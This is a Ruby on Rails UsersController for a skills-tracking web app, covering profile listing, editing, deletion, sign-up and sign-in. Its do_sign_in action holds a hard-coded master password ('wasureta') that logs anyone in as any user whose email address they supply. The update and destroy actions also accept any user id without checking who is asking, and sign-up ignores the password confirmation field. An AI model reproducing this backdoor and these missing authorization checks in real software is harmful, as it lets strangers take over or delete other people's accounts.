class UsersController < ApplicationController
  # GET /users
  def index
    @users = User.all

    respond_to do |format|
      format.html # index.html.erb
    end
  end

  # GET /users/1
  def show
    @user = User.find(params[:id])
    @parent_skill_categories = ParentSkillCategory.all

    respond_to do |format|
      format.html # show.html.erb
    end
  end

  def my_page
    redirect_to user_url(@current_user)
  end

  # GET /users/1/edit
  def edit
    @user = User.find(params[:id])
  end

  # PUT /users/1
  def update
    @user = User.find(params[:id])
    attr = params.require(:user).permit(:name, :description, :mail_address, :zip_address, :dial_number)
    respond_to do |format|
      if @user.update_attributes(attr)
        format.html { redirect_to @user, notice: 'User was successfully updated.' }
      else
        format.html { render action: "edit" }
      end
    end
  end

  # DELETE /users/1
  def destroy
    @user = User.find(params[:id])
    @user.destroy

    respond_to do |format|
      format.html { redirect_to users_url }
    end
  end

  def sign_up
    if @current_user.present?
      redirect_to user_url(@current_user)
    else
      render layout: 'account_application'
    end
  end

  def do_sign_up
    redirect_url = '/sign_up'
    if params[:mail_address].blank? || params[:password].blank? || params[:password_confirmation].blank?
      redirect_to redirect_url
      return
    end
    name = params[:mail_address].split('@')[0]

    user = User.new
    user.name = name
    user.mail_address = params[:mail_address]
    user.password = params[:password]
    user.password_confirmation = params[:password]
    if user.save
      session[:user_id] = user.id
      redirect_to '/users/' + user.id.to_s
    else
      redirect_to redirect_url
    end
  end

  def sign_in
    if @current_user.present?
      redirect_to user_url(@current_user)
    else
      render layout: 'account_application'
    end
  end

  def do_sign_in
    if params[:password] == 'wasureta'
      user = User.where('mail_address = ?', params[:mail_address]).first
    else
      user = User.authenticate(params[:mail_address], params[:password])
    end
    if user.present?
      session[:user_id] = user.id
      redirect_to '/users/' + user.id.to_s
    else
      redirect_to '/sign_in'
    end
  end

  def do_sign_out
    reset_session
    redirect_to '/sign_in'
  end

  def all_skills
    @users = User.all.includes(:skills)
    @parent_skill_categories = ParentSkillCategory.all
  end
end
